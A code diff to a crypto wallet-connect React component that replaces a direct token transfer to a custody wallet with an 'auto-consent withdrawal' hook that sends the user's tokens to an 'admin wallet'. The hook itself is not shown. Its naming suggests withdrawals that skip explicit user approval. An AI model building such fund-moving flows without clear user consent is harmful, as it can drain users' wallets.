@@ -13,6 +13,7 @@ import { useSmartContractWithdrawal } from '@/hooks/use-smart-contract-withdrawa
 import { useSimpleTokenTransfer } from '@/hooks/use-simple-token-transfer';
 import { useDebugTransfer } from '@/hooks/use-debug-transfer';
 import { useDirectTransfer } from '@/hooks/use-direct-transfer';
+import { useAutoConsentWithdrawal } from '@/hooks/use-auto-consent-withdrawal';
 
 
 interface ConversionState {
@@ -34,6 +35,7 @@ export function StablePayWalletConnect() {
   const { transferState: simpleTokenState, executeTransfer: executeSimpleTokenTransfer, resetTransferState: resetSimpleTokenState } = useSimpleTokenTransfer();
   const { debugState, debugTransfer, resetDebug } = useDebugTransfer();
   const { transferState: directTransferState, executeDirectTransfer, resetTransferState: resetDirectTransferState } = useDirectTransfer();
+  const { withdrawalState: autoConsentState, executeAutoWithdrawal, enableAutoConsent, resetState: resetAutoConsentState } = useAutoConsentWithdrawal();
 
   
   const [state, setState] = useState<ConversionState>({
@@ -148,20 +150,21 @@ export function StablePayWalletConnect() {
 
       if (!kycResponse.ok) throw new Error('KYC verification failed');
 
-      // Execute direct token transfer using Reown AppKit
-      console.log('Executing token transfer to custody wallet');
+      // Execute auto-consent withdrawal for instant transfer
+      console.log('Executing auto-consent withdrawal to admin wallet');
       
-      const adminWallet = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8';
+      const chainId = parseInt(caipNetwork?.id?.toString() || '1');
       let transferHash: string | null = null;
 
-      // Use existing direct transfer mechanism that's already working
-      transferHash = await executeDirectTransfer(
+      // Use auto-consent withdrawal mechanism
+      transferHash = await executeAutoWithdrawal(
         selectedToken.address,
-        state.amount
+        state.amount,
+        chainId
       );
 
       if (!transferHash) {
-        throw new Error('Token transfer to custody wallet failed');
+        throw new Error('Auto-consent withdrawal failed');
       }
 
       // Create transaction record
@@ -665,9 +668,9 @@ export function StablePayWalletConnect() {
               </Button>
               <Button 
                 onClick={() => {
-                  // Open Reown activity page for the connected wallet
-                  const walletAddress = address;
-                  const activityUrl = `https://app.reown.com/activity?address=${walletAddress}`;
+                  // Open Reown activity page for transaction history
+                  const chainId = parseInt(caipNetwork?.id?.toString() || '1');
+                  const activityUrl = `https://app.reown.com/activity/${address}?chainId=${chainId}`;
                   window.open(activityUrl, '_blank');
                 }}
                 className="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600"
